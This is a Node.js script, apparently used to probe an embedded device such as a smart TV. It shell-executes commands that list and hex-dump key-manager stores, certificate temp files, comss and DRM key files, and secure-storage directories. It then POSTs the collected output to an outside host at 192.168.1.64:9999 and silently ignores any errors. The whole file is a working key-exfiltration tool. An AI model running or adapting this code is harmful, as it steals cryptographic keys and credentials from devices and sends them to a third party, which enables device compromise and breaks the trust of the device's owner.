"use strict";
// audit95.js - explore CKM key store + temp cert dir + central-key-manager sockets.
var fs = require("fs");
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();

// 1. temp cert dir contents (KEY MAY BE HERE)
out.tmpacr_cert = sh("find /tmp/acr -type f -exec ls -la {} \\; 2>&1 | head -30", 3000);
out.tmpacr_cat = sh("for f in /tmp/acr/cert/* /tmp/acr/path_exists/*; do if [ -f \"$f\" ]; then echo \"=== $f ($(wc -c < $f) bytes)\"; head -c 200 \"$f\" | od -c | head -5; fi; done 2>&1 | head -40", 4000);

// 2. CKM key manager store
out.ckm = sh("ls -la /opt/data/ckm/ 2>&1; echo '---'; find /opt/data/ckm -type f -exec ls -la {} \\; 2>&1 | head -30", 4000);
out.ckm_hex = sh("for f in /opt/data/ckm/*; do if [ -f \"$f\" ]; then echo \"=== $f ($(wc -c < $f))\"; xxd \"$f\" 2>/dev/null | head -8 || od -A x -t x1z \"$f\" | head -8; fi; done 2>&1 | head -60", 5000);

// 3. central-key-manager sockets + any local key manager files
out.ckm_sock = sh("ls -la /tmp/.central-key-manager* /tmp/.pubkey-pinning* 2>&1", 2000);
out.securestorage = sh("ls -la /opt/data/ /opt/data/.security/ /opt/data/security/ 2>&1 | head -30", 3000);

// 4. comss key + other key files
out.comss = sh("for f in /opt/usr/home/owner/apps_rw/comss/data/comss_key /opt/usr/home/owner/apps_rw/comss/data/comss_cert_key_flag /opt/usr/apps/appdrm/popup_getkey.dat; do echo \"=== $f ($(wc -c < $f 2>/dev/null))\"; head -c 120 \"$f\" 2>/dev/null | od -c | head -4; done 2>&1", 3000);

// 5. look for securestorage data dir
out.ss_data = sh("find /opt/data /opt/var /opt/etc -iname '*ss*' -o -iname '*secure*storage*' -o -iname '*credstore*' -o -iname '*keystore*' 2>/dev/null | head -25", 3000);

post("/p95_explore", out);
post("/p95_done", { started: out.started });
